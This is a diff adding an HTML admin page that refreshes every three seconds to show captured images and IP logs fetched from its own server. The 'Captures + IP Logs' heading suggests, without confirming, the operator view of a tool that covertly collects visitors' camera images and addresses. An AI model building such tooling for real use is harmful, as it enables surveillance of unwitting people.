@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin</title>
+    <style>
+        body {
+            background:#111;
+            color:white;
+            padding:20px;
+            font-family:Arial;
+        }
+        img {
+            max-width:300px;
+            margin:10px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>📡 Captures + IP Logs</h1>
+
+<div id="images"></div>
+<pre id="logs"></pre>
+
+<script>
+async function load() {
+    const res = await fetch('/api/data');
+    const data = await res.json();
+
+    const imgDiv = document.getElementById('images');
+    imgDiv.innerHTML = "";
+
+    data.files.forEach(f => {
+        const img = document.createElement('img');
+        img.src = "/captures/" + f + "?" + Date.now();
+        imgDiv.appendChild(img);
+    });
+
+    document.getElementById('logs').innerText = data.logs.join("");
+}
+
+setInterval(load, 3000);
+load();
+</script>
+
+</body>
+</html>
